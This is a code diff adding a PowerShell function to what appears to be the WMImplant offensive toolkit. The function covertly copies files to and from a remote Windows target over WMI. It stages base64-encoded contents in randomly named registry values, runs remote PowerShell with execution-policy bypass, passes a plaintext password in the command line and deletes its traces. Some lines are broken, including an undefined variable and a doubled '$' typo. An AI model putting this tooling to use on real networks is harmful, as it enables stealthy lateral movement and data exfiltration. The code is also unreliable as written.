@@ -4058,6 +4058,202 @@ function Invoke-FileTransferWMImplant
     end{}
 } # End of Function block
 
+function Invoke-FileTransferWMImplantDG
+{
+    param
+    (
+        [Parameter(Mandatory = $False)]
+        [System.Management.Automation.PSCredential]$Creds,
+        [Parameter(Mandatory = $False)]
+        [string]$Target,
+        [Parameter(Mandatory = $False,ParameterSetName='download')]
+        [switch]$Download,
+        [Parameter(Mandatory = $False,ParameterSetName='upload')]
+        [switch]$Upload,
+        [Parameter(Mandatory = $False)]
+        [string]$DownloadFile,
+        [Parameter(Mandatory = $False)]
+        [string]$DownloadFilePath,
+        [Parameter(Mandatory = $False)]
+        [string]$UploadFile,
+        [Parameter(Mandatory = $False)]
+        [string]$UploadFilePath,
+        [Parameter(Mandatory = $False)]
+        [string]$LocalUser,
+        [Parameter(Mandatory = $False)]
+        [string]$LocalPass
+    )
+
+    Process
+    {
+        # invoke powershell on both remote and local system.  Both will connect back over WMI to retrieve file contents
+        # applies to both download and upload operations.
+        #2147483650 - hklm, 2147483649 - kkcu, 
+
+        $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
+        $registryupname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
+        $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
+        # The reghive value is for hkey_local_machine
+        $reghive = 2147483650
+        $regpath = "SOFTWARE\Microsoft\Windows"
+        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
+
+        # Get information needed to transfer the file
+        if(!$Target)
+        {
+            $Target = Read-Host "What system are you targeting? >"
+            $Target = $Target.Trim()
+        }
+
+        if($Download)
+        {
+            if(!$DownloadFile)
+            {
+                $Download_File = Read-Host "What's the full path to the file you'd like to download? >"
+                $Download_File = $Download_File.Trim()
+            }
+            else
+            {
+                $Download_File = $DownloadFile
+            }
+
+            if(!$DownloadFilePath)
+            {
+                $Download_File_Path = Read-Host "What's the full path to location you'd like to save the file locally? >"
+                $Download_File_Path = $Download_File_Path.Trim()
+            }
+            else
+            {
+                $Download_File_Path = $DownloadFilePath
+            }
+
+            $temp_path = Split-Path -Path $Download_File
+            $temp_path += '\temp.txt'
+
+            # On remote system, save file to registry
+            Write-Verbose "Reading remote file and writing on remote registry"
+            $remote_command = 'certutil -encode ''' + "$Download_file" + ''' ''' + $temp_path + '''; $fct = Get-Content -Path ''' + "$temp_path" + '''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force; del ''' + "$temp_path"
+            $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'
+
+            if($Creds)
+            {
+                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Credential $Creds -ComputerName $Target
+            }
+            else
+            {
+                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -ComputerName $Target
+            }
+
+            Write-Verbose "Sleeping to let remote system read and store file"
+            Start-Sleep -s 30
+
+            # Grab file from remote system's registry
+            Write-Verbose "Reading file from remote registry"
+
+            if($Creds)
+            {
+                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
+            }
+            else
+            {
+                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
+            }
+            
+            # Write encoded file to disk, decode it
+            $store_path = Split-Path -Path $$Download_File_Path
+            $store_path += '\dcdtemp.txt'
+            Set-Content -Path $store_path -Value $remote_reg.sValue
+            certutil -decode $store_path $Download_File_Path
+            del $store_path
+
+            # Removing Registry value from remote system
+            Write-Verbose "Removing registry value from remote system"
+
+            if($Creds)
+            {
+                Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
+            }
+            else
+            {
+                Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target
+            }
+
+            Write-Verbose "Done!"
+        }
+
+        elseif($Upload)
+        {
+            if(!$UploadFile)
+            {
+                $Upload_File = Read-Host "What's the full path to the file you'd like to upload? >"
+                $Upload_File = $Upload_File.Trim()
+            }
+            else
+            {
+                $Upload_File = $UploadFile
+            }
+
+            if(!$UploadFilePath)
+            {
+                $Upload_Dir = Read-Host "What is the full path to the location you would like the file uploaded to? >"
+                $Upload_Dir = $Upload_Dir.Trim()
+            }
+            else
+            {
+                $Upload_Dir = $UploadFilePath
+            }
+
+            if(!$LocalUser -or !$LocalPass)
+            {
+                Write-Verbose "Please provide username and password for this system!"
+                $LocalUser = Read-Host "What's the domain\username account for the system WMImplant is running on? >"
+                $LocalUser = $LocalUser
+                $LocalPass = Read-Host "Password >"
+                $LocalPass = $LocalPass
+            }
+
+            # Base64 encode file, read it in, and store in registry
+            Write-Verbose "Read in local file and base64 encode it"
+            $temp_path = Split-Path -Path $Upload_File
+            $temp_path += '\temp.txt'
+            certutil -encode $Upload_File $temp_path
+            $filecontentencoded = Get-Content $temp_path
+            del $temp_path
+
+            Write-Verbose "Writing encoded file to local registry"
+            $localkey = New-ItemProperty -Path $fullregistrypath -Name $registryupname -Value $filecontentencoded -PropertyType String -Force
+
+            # Temp location for decoding file
+            $upload_temp = Split-Path -Path $Upload_Dir
+            $upload_temp += '\updcd.txt'
+            
+            # grabs registry value and saves to disk
+            Write-Verbose "Connecting to $Target"
+            $remote_posh = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $pas = ConvertTo-SecureString ''' + "$LocalPass'" + ' -asplaintext -force; $crd = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist ''' + "$LocalUser'" +',$pas; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value -ComputerName ' + "$SystemHostname" + ' -Credential $crd; Set-Content -Path ' + "$upload_temp" + ' ' +  "$out.sValue" + '; certutil -decode ' + "$upload_temp" + ' ' + "$Upload_Dir" + '; del ' + "$upload_temp"
+            $remote_posh = 'powershell -nop -exec bypass -c "' + $remote_posh + '"'
+
+            if($Creds)
+            {
+                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_posh -Credential $Creds -ComputerName $Target
+            }
+            else
+            {
+                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_posh -ComputerName $Target
+            }
+
+            Write-Verbose "Sleeping to let remote system execute WMI command"
+            Start-Sleep -s 30
+
+            # Remove registry key
+            Write-Verbose "Removing registry value storing uploaded file"
+            $local_reg = Remove-ItemProperty -Path $fullregistrypath -Name $registryupname
+
+            Write-Verbose "Done!"
+        }
+    } # End of Process Block
+    end{}
+} # End of Function block
+
 function Invoke-LSWMImplant
 {
     param
